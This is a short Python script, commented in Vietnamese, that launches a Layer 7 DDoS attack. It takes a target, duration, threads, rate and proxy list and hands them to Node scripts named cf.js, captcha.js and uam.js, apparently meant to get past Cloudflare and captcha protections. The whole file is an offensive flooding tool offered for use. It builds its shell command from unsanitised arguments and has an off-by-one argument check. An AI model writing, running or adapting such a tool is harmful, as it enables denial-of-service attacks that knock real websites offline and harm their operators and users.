import subprocess
import os
import sys

# Bỏ hết panel hỏi, chạy thẳng DDoS Layer7
def main():
    if len(sys.argv) < 7:
        print("Sai lệnh bro! Dùng: python3 run.py 2 1 method target time threads rate proxy.txt")
        sys.exit(1)

    # Đọc thẳng thông số từ argv (bypass hết input)
    ddos_type = sys.argv[1]  # 2 = DDoS
    layer_type = sys.argv[2]  # 1 = Layer7
    method = sys.argv[3]
    target = sys.argv[4]
    time = sys.argv[5]
    threads = sys.argv[6]
    rate = sys.argv[7]
    proxy = sys.argv[8] if len(sys.argv) > 8 else "proxy.txt"

    print(f"Đang bắn Layer7 cực mạnh!")
    print(f"Target: {target}")
    print(f"Method: {method}")
    print(f"Time: {time}s")
    print(f"Threads: {threads}")
    print(f"Rate: {rate}")
    print(f"Proxy: {proxy} ({len(open(proxy).readlines())} dòng)")

    # Chạy thẳng lệnh DDoS
    if method == "1":
        cmd = f"node cf.js {target} {time} {threads} {rate} {proxy}"
    elif method == "2":
        cmd = f"node cf.js {target} {time} {threads} {rate} {proxy} --full --cache"
    elif method == "3":
        cmd = f"node captcha.js {target} {time} {threads} {rate} {proxy}"
    elif method == "4":
        cmd = f"node uam.js {target} {time} {threads} {rate} {proxy}"

    subprocess.run(cmd, shell=True)

if __name__ == "__main__":
    main()
